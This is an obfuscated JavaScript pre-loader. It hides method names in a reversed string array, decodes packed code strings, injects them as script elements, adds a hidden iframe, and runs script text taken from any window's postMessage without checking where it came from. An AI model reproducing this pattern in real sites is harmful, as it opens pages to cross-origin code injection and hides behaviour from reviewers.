let windowEvent = (e) => {
    if (e.type[_uz.a[16]](/(message)/))
        try {
            _uz.session = !_uz.session ? e.data.session : _uz.session;
            if (e.data.action && e.data.action[_uz.a[16]](/(pre-loader)/)) {
                if (e.data.action && e.data.action[_uz.a[16]](/(cors)/)) {
                    for (let i in e.data.cors)
                        _uz[_uz.a[8]](".pre-loader", e.data.cors[i]);
                    if (!_uz.match) {
                        _uz[_uz.a[8]](".pre-loader", _uz[_uz.a[7]]({ text: `_uz.x=ĀĂif[Ć.a[22]]ă;ċxĊāČ[19đ("")ĔĘĖċč20ĝğġĕ._pm.start.cleaner=setIntĽval(()=>{Ĉ(ĬĮİĲĴĶpasŀd){ĸĺrŃŅrŇŉŒįıĳĵķĹĻĽġŀtTimeoutŊŌŎċĈėĂĦ1ĝġdocuŵńſę17ĩ.pre-loadĽĠƋĦ3đ="<div ĸřs='inļr oļ'></ƢvƳƶƥlƧƩƫƭ twoƲƴƶƸƣƺƼƪƬĽǀhƒeǄƵƣ>"},1536)}Ǘ600)`, bits: 256 }));
                        _pm.user = _uz.x._pm.user;
                    }
                }
            };
        } catch (error) {};
},
_uz = {
    planeText: (d) => {
        try {
            d.d = (d.text + "")[_uz.a[0]]("");
            d.c = d.d[0];
            d = Object[_uz.a[1]]({ e: d.bits, o: [d.c], l: d.c, t: {} }, d);
            for (d.i = 1; d.i < d.d.length; d.i++) {
                d.currCode = d.d[d.i][_uz.a[2]](0);
                if (d.currCode >= d.bits) {
                    d.p = d.t[d.currCode] ? d.t[d.currCode] : d.l + d.c;
                } else d.p = d.d[d.i];
                d.o[_uz.a[3]](d.p);
                d.c = d.p[_uz.a[4]](0);
                d.t[d.e] = d.l + d.c;
                d.e++;
                d.l = d.p;
            }
            return d.o[_uz.a[5]]("");
        } catch (e) {}
    },
    xncode: (e, c, t, i, u) => {
        t = t ? t : c[_uz.a[9]](`<${_uz.a[12]} type="importmap">`) ? "importmap" : c[_uz.a[9]](`<${_uz.a[12]} type="text/js-worker"`) ? "text/js-worker" : c[_uz.a[9]](`<${_uz.a[12]} type="module">`) ? "module" : `text/java${_uz.a[12]}`;
        if (c) {
            if (c[_uz.a[9]]('type="text/js-worker" id="')) i = c[_uz.a[0]]('type="text/js-worker" id="')[1][_uz.a[0]]('">')[0];
            c = c[_uz.a[10]](`<${_uz.a[12]} type="text/js-worker" id="aiPhysics">`, "")[_uz.a[10]](`<${_uz.a[12]} type="module">`, "")[_uz.a[10]](`<${_uz.a[12]}>`, "")[_uz.a[10]](`<\/${_uz.a[12]}>`, "");    
        }
        s = document[_uz.a[11]](_uz.a[12]);
        s.type = t;
        if (i) s.id = i;
        if (u) {
            s[_uz.a[13]](u.pro, u.val)
            s.src = u.src;
        } else try {
            s[_uz.a[14]](document[_uz.a[15]](c));
        } catch (e) { s.text = c }
        try {
            if (e[_uz.a[16]](/(head|body)/)) document[e][_uz.a[14]](s);
            else  document[_uz.a[17]](e)[_uz.a[14]](s);        
        } catch (err) { location.reload() }
    },
    offline: !0,
    a: "split,reverse,join".split(",")
};
_uz.a = "nioj,tArahc,hsup,tAedoCrahc,ngissa,tilps"[_uz.a[0]]("")[_uz.a[1]]()[_uz.a[2]]("")[_uz.a[0]](",");
_uz = Object[_uz.a[1]](_uz, { a: _uz.a.concat(JSON.parse(_uz.planeText({ text: `["Ensure all detailsĈĆ corĆct","planeTexĜĞxnėčĝ"iīlučsĮĆĠaceĮcĆateElemenĨ"sĽipňsĎAttribuŀĮappņdChđdļľŀĥħNoĭĞmĿchĮquerySeŃěĘřddEvņtLisŀģrĮņĽyōĮčƊƌĞĆmoſļoŇƀWİdowĮİƆHTMLĮ"]`, bits: 256 }))) });
_uz[_uz.a[8]](".pre-loader", _uz[_uz.a[7]]({ text: `_uz.if=document.createEleċč("Ąraċ");ĀĂĄ.styė.display='none'ģāăfħrc="assets/ıyouň/peels";ćĉęĎquerySœectorě.pđ-loadŞġ.apőndChild(ĤĽ)`, bits: 256 }));
window[_uz.a[18]]("message", windowEvent);